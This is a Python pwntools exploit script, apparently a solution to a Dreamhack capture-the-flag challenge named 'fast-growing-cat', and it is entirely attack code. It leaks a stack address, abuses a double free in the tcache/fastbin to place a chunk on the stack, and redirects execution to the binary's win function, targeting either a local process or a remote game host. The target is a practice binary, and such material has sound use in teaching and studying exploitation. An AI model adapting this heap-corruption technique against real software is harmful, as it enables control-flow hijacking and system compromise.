#!/usr/bin/python3

from pwn import *

exe = ELF("fast-growing-cat_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                b*0x4016D7

                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("host3.dreamhack.games", 9693)
else:
    p = process(exe.path)


def create(idx, name):
    sla(b"meow? ", b"miow")
    sla(b"food? ", name)
    sla(b"in? ", str(idx).encode())


def delete(idx):
    sla(b"meow? ", b"meow")
    sla(b"feed? ", str(idx).encode())


for i in range(7):
    create(0, b"wan")
    delete(0)


sla(b"meow? ", b"a" * 32)
p.recvuntil(b"a" * 32)
stack = u64(p.recvuntil(b"~", drop=True).ljust(8, b"\0"))
info("stack: " + hex(stack))

create(1, b"wan")
create(2, b"wan")
delete(2)
delete(1)
delete(2)

create(2, p64(stack-0x20))
create(2, p64(0))
# GDB()
create(2, p64(0))

sla(b"meow? ",b'miow\0'.ljust(0x20-8) + p64(0x41) )
sla(b"food? ", p64(exe.sym.win)*5)
sla(b"in? ", str(0).encode())
sla(b"meow? ", b"muow")

p.interactive()

